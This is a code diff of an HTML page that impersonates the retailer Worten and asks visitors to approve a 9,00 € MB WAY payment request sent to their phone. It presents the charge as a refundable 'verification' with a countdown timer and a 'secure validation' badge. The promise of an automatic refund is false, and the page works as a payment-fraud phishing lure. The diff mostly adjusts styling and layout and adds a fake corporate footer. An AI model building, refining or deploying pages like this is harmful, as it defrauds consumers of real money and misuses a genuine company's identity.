@@ -11,61 +11,39 @@
         rel="stylesheet">
     <link rel="icon" href="/assets/worten-logo.svg" type="image/svg+xml">
     <style>
-        /* Modern Reset & Base */
-        * {
-            box-sizing: border-box;
-        }
-
+        /* Base Overrides */
         body {
-            font-family: 'Inter', 'Open Sans', sans-serif;
-            background: #f4f7f6;
-            margin: 0;
-            padding: 0;
-            color: #1f2937;
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
+            background: white !important;
+            display: block !important;
+            padding: 0 !important;
+            min-height: auto !important;
+            font-family: 'Open Sans', 'Arial', sans-serif;
+            color: #333;
         }
 
         #worten-header {
-            background: #d32f2f;
-            padding: 16px 20px;
+            background: #d32f2f !important;
+            padding: 15px 20px !important;
             text-align: center;
-            box-shadow: 0 4px 12px rgba(211, 47, 47, 0.2);
-            position: relative;
-            z-index: 10;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
         }
 
         .main-container {
-            max-width: 480px;
-            width: 95%;
-            margin: 30px auto;
+            max-width: 500px;
+            margin: 20px auto;
             background: white;
-            border-radius: 20px;
-            box-shadow: 0 20px 40px -10px rgba(0, 0, 0, 0.1);
+            border-radius: 12px;
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.1);
             overflow: hidden;
-            padding: 40px 30px;
+            padding: 30px 25px;
             text-align: center;
             position: relative;
-            animation: slideUp 0.6s cubic-bezier(0.16, 1, 0.3, 1);
-        }
-
-        @keyframes slideUp {
-            from {
-                transform: translateY(30px);
-                opacity: 0;
-            }
-
-            to {
-                transform: translateY(0);
-                opacity: 1;
-            }
         }
 
         /* Hero Section */
         .mbway-hero {
             position: relative;
-            margin-bottom: 25px;
+            margin-bottom: 20px;
             display: inline-block;
         }
 
@@ -80,8 +58,8 @@
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
-            width: 80px;
-            height: 80px;
+            width: 70px;
+            height: 70px;
             border-radius: 50%;
             border: 2px solid rgba(211, 47, 47, 0.2);
             animation: ripple 2s infinite linear;
@@ -92,215 +70,116 @@
             animation-delay: 0.5s;
         }
 
-        .ripple:nth-child(3) {
-            animation-delay: 1s;
-        }
-
         @keyframes ripple {
             0% {
-                width: 80px;
-                height: 80px;
+                width: 70px;
+                height: 70px;
                 opacity: 1;
             }
 
             100% {
-                width: 180px;
-                height: 180px;
+                width: 140px;
+                height: 140px;
                 opacity: 0;
             }
         }
 
-        /* Timer Section */
+        /* Timer */
         .timer-container {
-            margin-bottom: 30px;
+            margin-bottom: 25px;
         }
 
         .countdown-text {
-            font-size: 38px;
+            font-size: 32px;
             font-weight: 800;
-            font-variant-numeric: tabular-nums;
             color: #111;
-            letter-spacing: -1px;
-            line-height: 1;
         }
 
         .countdown-label {
-            font-size: 13px;
-            color: #6b7280;
+            font-size: 11px;
+            color: #666;
             font-weight: 600;
             text-transform: uppercase;
-            letter-spacing: 1.5px;
-            margin-top: 5px;
+            letter-spacing: 1px;
         }
 
-        /* Status Badge */
-        .status-badge {
-            display: inline-flex;
-            align-items: center;
-            gap: 8px;
-            background: #fff5f5;
-            color: #d32f2f;
-            padding: 8px 16px;
-            border-radius: 100px;
-            font-size: 14px;
-            font-weight: 700;
-            margin-bottom: 25px;
-            border: 1px solid #fed7d7;
-            animation: pulse-soft 2s infinite;
-        }
-
-        .status-dot {
-            width: 8px;
-            height: 8px;
-            background: #d32f2f;
-            border-radius: 50%;
-        }
-
-        @keyframes pulse-soft {
-            0% {
-                box-shadow: 0 0 0 0 rgba(211, 47, 47, 0.2);
-            }
-
-            70% {
-                box-shadow: 0 0 0 6px rgba(211, 47, 47, 0);
-            }
-
-            100% {
-                box-shadow: 0 0 0 0 rgba(211, 47, 47, 0);
-            }
-        }
-
-        /* Notification Simulation Card */
+        /* Notification Card - Compact */
         .notif-card {
             background: #f8fafc;
-            border-radius: 12px;
-            padding: 16px;
+            border-radius: 10px;
+            padding: 15px;
             text-align: left;
-            margin-bottom: 30px;
+            margin-bottom: 25px;
             border-left: 4px solid #d32f2f;
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.03);
-            position: relative;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
+            font-size: 14px;
         }
 
         .notif-title {
-            font-size: 13px;
+            font-size: 11px;
             color: #64748b;
-            margin-bottom: 4px;
-            font-weight: 600;
-            display: flex;
-            justify-content: space-between;
+            margin-bottom: 5px;
+            font-weight: 700;
+            text-transform: uppercase;
         }
 
         .notif-body {
-            font-size: 15px;
-            color: #1e293b;
             font-weight: 500;
-            line-height: 1.4;
+            color: #333;
         }
 
         .target-phone {
-            font-weight: 800;
-            color: #111;
-            background: #e2e8f0;
-            padding: 2px 6px;
-            border-radius: 4px;
-        }
-
-        /* Primary Action Button */
-        .check-btn {
-            width: 100%;
-            padding: 18px;
-            background: #111;
-            background: linear-gradient(135deg, #222, #000);
-            color: white;
             font-weight: 700;
-            border: none;
-            border-radius: 12px;
-            font-size: 16px;
-            cursor: pointer;
-            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
-            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.15);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
+            color: #000;
         }
 
-        .check-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 12px 25px rgba(0, 0, 0, 0.25);
-            background: linear-gradient(135deg, #333, #111);
-        }
-
-        .check-btn:active {
-            transform: scale(0.98);
-        }
-
-        /* Helper Info */
-        .helper-text {
-            margin-top: 25px;
-            font-size: 13px;
-            color: #94a3b8;
-            line-height: 1.6;
-            max-width: 90%;
-            margin-left: auto;
-            margin-right: auto;
-        }
-
-        .secure-footer {
-            margin-top: 30px;
-            padding-top: 20px;
-            border-top: 1px dashed #e2e8f0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            gap: 8px;
-            color: #4caf50;
-            font-size: 12px;
-            font-weight: 600;
-        }
-
-        /* Steps as visual timeline */
+        /* Visual Timeline - Optimized Spacing */
         .steps-visual {
             display: flex;
             justify-content: space-between;
-            margin: 30px 0;
+            margin: 25px 0;
             position: relative;
+            padding: 0 10px;
         }
 
         .steps-visual::before {
             content: '';
             position: absolute;
-            top: 20px;
-            left: 20px;
-            right: 20px;
+            top: 15px;
+            left: 30px;
+            right: 30px;
             height: 2px;
-            background: #e2e8f0;
+            background: #e0e0e0;
             z-index: 0;
         }
 
         .step-node {
             position: relative;
             z-index: 1;
-            background: white;
-            width: 40px;
             display: flex;
             flex-direction: column;
             align-items: center;
-            gap: 8px;
+            gap: 5px;
+            width: 60px;
+            /* Fixed width to prevent overlap */
         }
 
         .icon-circle {
-            width: 42px;
-            height: 42px;
+            width: 32px;
+            height: 32px;
+            /* Smaller circles */
             border-radius: 50%;
             background: #fff;
-            border: 2px solid #e2e8f0;
+            border: 2px solid #e0e0e0;
             display: flex;
             align-items: center;
             justify-content: center;
-            color: #94a3b8;
-            transition: all 0.3s;
+            color: #aaa;
+        }
+
+        .icon-circle svg {
+            width: 16px;
+            height: 16px;
         }
 
         .step-node.active .icon-circle {
@@ -312,25 +191,69 @@
         .step-label {
             font-size: 10px;
             font-weight: 700;
-            color: #64748b;
+            color: #777;
             text-transform: uppercase;
         }
 
         .step-node.active .step-label {
             color: #d32f2f;
         }
+
+        /* CTA */
+        .check-btn {
+            width: 100%;
+            padding: 15px;
+            background: #333;
+            /* Darker, sleek */
+            color: white;
+            font-weight: 700;
+            border: none;
+            border-radius: 8px;
+            font-size: 14px;
+            text-transform: uppercase;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            transition: background 0.2s;
+        }
+
+        .check-btn:hover {
+            background: #555;
+        }
+
+        .helper-text {
+            margin-top: 15px;
+            font-size: 11px;
+            color: #777;
+            line-height: 1.5;
+        }
+
+        .secure-footer {
+            margin-top: 20px;
+            padding-top: 15px;
+            border-top: 1px dashed #eee;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 5px;
+            color: #4caf50;
+            font-size: 11px;
+            font-weight: 700;
+        }
     </style>
 </head>
 
 <body>
-    <!-- Header -->
+    <!-- Original Header -->
     <div id="worten-header">
-        <img src="/assets/worten-logo.svg" style="width: 110px; filter: brightness(0) invert(1);">
+        <img src="/assets/worten-logo.svg" style="width: 120px; filter: brightness(0) invert(1);">
     </div>
 
     <div class="main-container">
 
-        <!-- Animated Hero -->
+        <!-- Hero -->
         <div class="mbway-hero">
             <div class="ripple"></div>
             <div class="ripple"></div>
@@ -338,22 +261,8 @@
                 class="mbway-logo" alt="MB WAY">
         </div>
 
-        <div class="status-badge">
-            <span class="status-dot"></span>
-            <span>Aguardando Aprovação</span>
-        </div>
-
-        <!-- Notification Preview -->
-        <div class="notif-card">
-            <div class="notif-title">
-                <span>MB WAY • Agora</span>
-                <span>9,00 €</span>
-            </div>
-            <div class="notif-body">
-                Pedido de <strong>Worten Equip. Lar SA</strong><br>
-                enviado para <span id="userPhoneDisplay" class="target-phone">...</span>
-            </div>
-        </div>
+        <h3 style="margin: 0 0 5px; font-size: 16px; color: #d32f2f;">Aguardando Aprovação</h3>
+        <p style="margin: 0 0 20px; font-size: 13px; color: #666;">Por favor, abra a App</p>
 
         <!-- Timer -->
         <div class="timer-container">
@@ -361,19 +270,30 @@
             <div class="countdown-label">Tempo Restante</div>
         </div>
 
-        <!-- Visual Steps -->
+        <!-- Notification Card -->
+        <div class="notif-card">
+            <div class="notif-title">
+                <span>Notificação</span>
+            </div>
+            <div class="notif-body">
+                Foi enviado um pedido de <strong>9,00 €</strong> para o número <span id="userPhoneDisplay"
+                    class="target-phone">...</span>
+            </div>
+        </div>
+
+        <!-- Visual Timeline -->
         <div class="steps-visual">
             <div class="step-node active">
                 <div class="icon-circle">
-                    <svg width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                         <path d="M12 18l0-12m0 0l-5 5m5-5l5 5"></path>
                     </svg>
                 </div>
                 <span class="step-label">Enviado</span>
             </div>
             <div class="step-node active">
-                <div class="icon-circle" style="animation: pulse 1s infinite;">
-                    <svg width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+                <div class="icon-circle" style="animation: pulse-soft 1.5s infinite;">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                         <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
                     </svg>
                 </div>
@@ -381,7 +301,7 @@
             </div>
             <div class="step-node">
                 <div class="icon-circle">
-                    <svg width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                         <path d="M20 6L9 17l-5-5"></path>
                     </svg>
                 </div>
@@ -392,32 +312,69 @@
         <!-- CTA -->
         <button class="check-btn" onclick="checkStatus()">
             <span>JÁ ACEITEI NA APP</span>
-            <svg width="20" height="20" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24">
+            <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
                 <path d="M5 12h14M12 5l7 7-7 7"></path>
             </svg>
         </button>
 
         <p class="helper-text">
-            O valor de verificação (9,00 €) será estornado automaticamente assim que confirmares a operação na tua app
-            MB WAY.
+            O estorno é automático. O valor nunca será cobrado permanentemente.
         </p>
 
         <div class="secure-footer">
-            <svg width="14" height="14" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+            <svg width="12" height="12" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
                 <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
                 <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
             </svg>
-            Pagamento 100% Seguro e Reembolsável
+            Validação Segura
         </div>
 
     </div>
 
-    <!-- Official Footer (Simplified) -->
-    <footer class="worten-footer"
-        style="margin-top: auto; border-top: 1px solid #eee; padding: 20px; background: white; text-align: center;">
-        <img src="/assets/worten-logo.svg" style="width: 80px; margin-bottom: 10px; opacity: 0.6;">
-        <p style="font-size: 11px; color: #999;">© 2024 Worten - Equipamentos para o Lar, S.A.</p>
+    <!-- Original Footer -->
+    <footer class="worten-footer">
+        <img src="/assets/worten-logo.svg" class="footer-logo" alt="Worten">
+        <div class="footer-content">
+            <div class="footer-col">
+                <h4>Apoio ao Cliente</h4>
+                <ul>
+                    <li><a href="#">Ajuda e Contactos</a></li>
+                    <li><a href="#">Estado da Encomenda</a></li>
+                    <li><a href="#">Devoluções</a></li>
+                </ul>
+            </div>
+            <div class="footer-col">
+                <h4>Sobre Nós</h4>
+                <ul>
+                    <li><a href="#">Quem somos</a></li>
+                    <li><a href="#">Lojas</a></li>
+                    <li><a href="#">Worten Resolve</a></li>
+                </ul>
+            </div>
+            <div class="footer-col">
+                <h4>Links Úteis</h4>
+                <ul>
+                    <li><a onclick="openLegal('privacy')">Política de Privacidade</a></li>
+                    <li><a onclick="openLegal('terms')">Termos e Condições</a></li>
+                    <li><a href="#">Livro de Reclamações</a></li>
+                </ul>
+            </div>
+        </div>
+        <div class="footer-bottom">
+            <p>© 2024 Worten - Equipamentos para o Lar, S.A. Todos os direitos reservados.</p>
+        </div>
     </footer>
+
+    <!-- Legal Modals -->
+    <div id="legalModal" class="legal-modal">
+        <div class="legal-content">
+            <span class="close-legal" onclick="closeLegal()">&times;</span>
+            <h2 id="legalTitle" style="color: #d32f2f; margin-bottom: 20px;"></h2>
+            <div id="legalBody" style="font-size: 13px; color: #555;"></div>
+        </div>
+    </div>
+
+    <script src="script.js?v=23"></script>
 
     <!-- Logic -->
     <script>
